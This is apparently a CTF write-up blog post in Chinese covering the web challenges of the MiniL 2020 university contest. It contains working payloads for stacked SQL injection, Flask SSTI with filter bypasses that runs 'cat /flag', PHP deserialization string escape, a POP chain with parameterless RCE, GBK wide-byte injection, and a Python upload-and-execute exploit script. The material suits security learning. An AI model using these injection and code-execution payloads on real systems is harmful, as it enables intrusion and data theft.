---
title: MiniL2020_web_wp
date: 2020-05-10
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120170521.png
description: 西电校赛
categories: 
- ctf_writeup
tags:
- 堆叠注入
- SSTI
- PHP反序列化
- 无参数RCE
- RCE bypass
- WebDav
---
西电校赛，难度适中，本人内鬼选手，看了下题。

------

### id_wife

考点：堆叠注入

不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生

测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考[新春战疫的一道sqli](http://wh1sper.com/2020i春秋新春战疫公益赛_web_wp/)，Handler一把梭

```
frank');handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#
```

minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}

 

 

 

### Personal_IP_Query

考察：flaskSSTI，绕过下划线、单双引号。

学习链接

\>>[flag0师傅](http://flag0.com/2018/11/11/浅析SSTI-python沙盒绕过/#过滤双下划线)

\>>[byc_404师傅](https://www.jianshu.com/p/fea23f17d497)

打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI

输入 `{{2+2}}` 之后回显的 `4` 实锤。

Fuzz，过滤了下划线、单双引号、没有过滤中括号

最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出

在class中寻找模块exp：

```
#python 3
import re
str = '''

（回显信息）

'''

list = re.split(',', str)

for i in range(0, len(list)):
      if 'catch_warnings' in list[i]:
            print(i)
            break
```

playload：

```
?x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__
&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('cat+/flag').read()

X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()
|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)
|attr(request.args.x4)(request.args.x8)(request.args.x9)}}
```

复现时补充：

我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：

```
XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}
//回显：Your IP: <class 'os._wrap_close'>

GET ：?class=__class__&mro=__mro__&subclasses=__subclasses__&init=__init__&globals=__globals
__&builtins=__builtins__&eval=eval&cmd=__import__("os").popen("cat+/flag").read()

x-forwarded-for: {{ [][request.args.class][request.args.mro][1][request.args.subclasses]()
[127][request.args.init][request.args.globals][request.args.builtins][request.args.eval]
(request.args.cmd) }}
```

 

 

 

### ezbypass

考察：过滤逗号等号的无列名注入，PHP反序列化字符逃逸

这道题两个步骤，第一层是sqli，第二层是反序列化字符串逃逸

第一层我做的非预期，fuzz过后，发现ban了逗号、等号、or

然后发现是双引号闭合

```
logname=1"||1 limit 1 offset 3#&logpass=1
回显：alert('Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a')
```

访问 `ip/flag327a6c4304a/` ，来到第二关：

```
<?php
include ('flag.php');
error_reporting(0);
function filter($payload){
    $key = array('php','flag','xdsec');
    $filter = '/'.implode('|',$key).'/i';
    return preg_replace($filter,'hack!!!!',$payload);
}

$payload=$_GET['payload'];
$fuck['mini']='nb666';
$fuck['V0n']='no_girlfriend';

if(isset($payload)) {
    if (strpos($payload, 'php') >=0 || strpos($payload, 'flag')>=0 || strpos($payload, 'xdsec')>=0) {
        $fuck['mini']=$payload;
        var_dump(filter(serialize($fuck)));
        $fuck=unserialize(filter(serialize($fuck)));
        var_dump($fuck);
        if ($fuck['V0n'] === 'has_girlfriend') {
            echo $flag;
        } else {
            echo 'fuck_no_girlfriend!!!';
        }
    }else{
        echo 'fuck_no_key!!!';
    }
}else{
    highlight_file(__FILE__);
}
```

题目会把序列化之后的 `php` `flag` `xdsec` 关键字替换为 `hack!!!!` 然后进行反序列化操作再赋值给 `$fuck` 我就直接想到了[安恒2020.4月赛](http://wh1sper.com/fakephp反序列化字符逃逸/)的web1，越看越像字符逃逸，不过有区别的是这里是字符变多导致后面的逃逸，不过思路一样：逃逸、闭合

我们的 `php` 关键字被替换为 `hack!!!!` 之后，从3个字符变成了5个字符，但是反序列化的时候由于 `s:3` 的存在，这个值仍然会被当作三个字符来处理，我们可以看到下图替换之后由于左边选中部分不一致，造成了反序列化后出现 `bool(false)` 的结果

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120170547.png)

直接看payload就懂：

```
?payload=phpphpphpphpphpphpphp";s:3:"V0n";s:14:"has_girlfriend";}
```

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120170556.png)

我们输入了56了字符， `phpphpphpphpphpphpphp` 被替换之后正好是56个字符，我们后面的字符就逃逸了，这个时候给他一闭和，flag就来了

minil{7f3ea366-f5ab-463c-b511-af63d6dc7715}

 

 

 

### Let's_Play_Dolls

考点：PHP无参数RCE、pop链

开题送码：

```
 <?php
error_reporting(0);
if(isset($_GET['a'])){
    unserialize($_GET['a']);
}
else{
    highlight_file(__FILE__);
}

class foo1{
    public $var='';
    function __construct(){
        $this->var='phpinfo();';
    }
    function execute(){
        if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $this->var)) { 
            if(!preg_match('/header|bin|hex|oct|dec|na|eval|exec|system|pass/i',$this->var)){
                eval($this->var);
            }  
            else{
                die("hacked!");
            }  
        }

    }
    function __wakeup(){
        $this->var="phpinfo();";
    }
    function __desctuct(){
        echo '<br>desctuct foo1</br>';
    }
}
class foo2{
    public $var;
    public $obj;
    function __construct(){
        $this->var='hi';
        $this->obj=null;
    }
    function __toString(){
        $this->obj->execute();
        return $this->var;
    }
    function __desctuct(){
        echo '<br>desctuct foo2</br>';
    }
}
class foo3{
    public $var;
    function __construct(){
        $this->var="index.php";
    }
    function __destruct(){
        if(file_exists($this->var)){
            echo "<br>".$this->var."exist</br>";
        }
        echo "<br>desctuct foo3</br>";
    }
    function execute(){
        print("hi");
    }
}
```

大概是这样：

```
$pop = new foo3;
$pop->var = new foo2;//触发__toString()，调用execute()
$pop->var->obj = new foo1;//调用foo1的execute()
```

成功调用foo1的execute()函数之后就需要我们绕正则，这里是无参数RCE， `if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $this->var))` 限制了参数；

查了一下?R，PHP manual中这样说：

- ”首先，它匹配一个左括号。 然后它匹配任意数量的非括号字符序列或一个模式自身的递归匹配(比如， 一个正确的括号子串)，最终，匹配一个右括号。“

大概是这个样子 `XXXX(XXXX(XXXX()))`

```
\W等价于[^A-Za-z0-9_]
+括号匹配\( ...... \)
+括号中间是XXXX(XXXX(XXXX()))
```

意思是我们可以 `a();` `a(a());` 但是不能 `a('1');` 。

需要我们进行不带参数的RCE，这里[王叹之师傅](https://www.cnblogs.com/wangtanzhi/p/12311239.html)讲的很好，基本就是那几个函数换着用，这里直接上playload；

把foo1的var属性改为：

```
print_r(array_reverse(scandir(current(localeconv()))));
返回值：
Array ( [0] => youCanGet1tmaybe [1] => index.php [2] => .. [3] => . )


print_r(scandir(next(scandir(current(localeconv())))));
返回值：
Array ( [0] => . [1] => .. [2] => html ) 
发现不是在上级目录，应该是读取youCanGet1tmaybe文件


print_r(readfile(end(scandir(current(localeconv())))));
返回值：
minil{af22c569-6114-44c6-8c8c-4b561cf7ac7b}
```

注意： `echo serialize($pop)之后`，需要绕过 `__wakeup()` 才行。

 

 

 

 

### are you reclu3e?

考点：vim文件恢复、宽字节注入、反序列化

其实宽字节一开始就测出来了。。。
只不过我以为是要到表里面去注什么东西，结果是只需要登陆就可以。。。

根据放出的hint，提示vim，马上想到.swp文件，login和index的全部整下来恢复

在login.php中发现GBK字样，实锤宽字节注入：

```
username=reclu3e%df' union select 1,1#&password=1
```

登录之后我们就有了session，可以GET传入p让他反序列化

根据网鼎的web1，PHP7.1+的版本，反序列化的时候不会对属性类型进⾏特别的处理

所以我们可以直接把他改成public来打：

```
<?php
    include "flag.php";//$flag="minilctf{****}";
    session_start();
    if (empty($_SESSION['uid'])) {
        include "loginForm.html";
    }
    else{
        echo '<h1>Hello, reclu3e!</h1>';
        $p=unserialize(isset($_GET["p"])?$_GET["p"]:"");
    }
?>
<?php
class person{
    public $name='';
    public $age=0;
    public $weight=0;
    public $height=0;
    public $serialize='";phpinfo();$s="';
    public function __wakeup(){
        if(is_numeric($this->serialize)){
            $this->serialize++;
        }
    }
    public function __destruct(){
        @eval('$s="'.$this->serialize.'";');
    }
}

$p = new person();
echo serialize($p);
//O:6:"person":5:{s:4:"name";s:0:"";s:3:"age";i:0;s:6:"weight";
i:0;s:6:"height";i:0;s:9:"serialize";s:16:"";phpinfo();$s="";}
```

flag就在PHPINFO里面

其实这是一道简单题，之前我就测出来宽字节，不过应该是information_schema里面的列名被删了，
我以为是要注密码来登录，结果没想到。。然后反序列化也简单，至于后来给了hint之后解出仍然这
么少，可能就是本题的槽点之一。

minil{22dac17a-b2e6-41c7-b969-5b1687fc73e1}

 

 

 

### p

考点：反序列化、RCE绕过

~~听说和CTFshow的红包题第二弹几乎差不多，当时没做，不过我看了wp之后发现我的操作几乎~~
~~一毛一样，不知道为什么没出。日后来填坑~~

md，不知道为啥，之前我自己构造了一个文件上传表单，然后用bp的intruder发包，费力不讨好，死活弄不出来。

后来看了@blackwatch师傅的wp之后，直接起一个几行代码的python就可以的。。。。

被自己菜哭，不多BB，exp：

```
import requests
import base64

url = 'http://2c0b5cfcdee39a9fb6e7f5789943ca90.challenge.mini.lctf.online:1080/'
git = 'O:6:"github":2:{s:3:"cmd";s:26:"?><?=`. /??p/p?p??????`;?>";}'
git = base64.b64encode(git.encode()).decode()
cookies = {'git': git}
files = {'file': '#!/bin/sh\ncat /* | grep "minil"\n'}
a = requests.post(url, files=files, cookies=cookies)
print(a.text)
```

minil{7da6b052-6630-40d8-9e7a-ccd5ff098871}

 

 

 

### include

考点：PHP语言逻辑、WebDav协议绕过RFI限制

不想做。。日后填坑